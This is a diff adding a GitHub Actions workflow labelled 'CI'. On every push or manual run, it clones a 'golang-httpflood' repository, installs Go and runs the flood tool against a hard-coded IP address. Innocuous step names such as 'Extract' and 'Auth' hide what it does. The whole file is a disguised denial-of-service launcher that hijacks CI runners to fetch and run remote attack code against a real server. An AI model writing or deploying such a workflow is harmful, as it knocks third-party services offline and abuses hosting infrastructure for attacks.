@@ -1,0 +1,16 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Download
+      run: git clone https://github.com/FloppaAirlines394/golang-httpflood.git
+    - name: Extract
+      run: sudo apt install golang
+    - name: Auth
+      run: go run golang-httpflood/httpflood.go https://176.9.16.251/ 200 get 600 nil
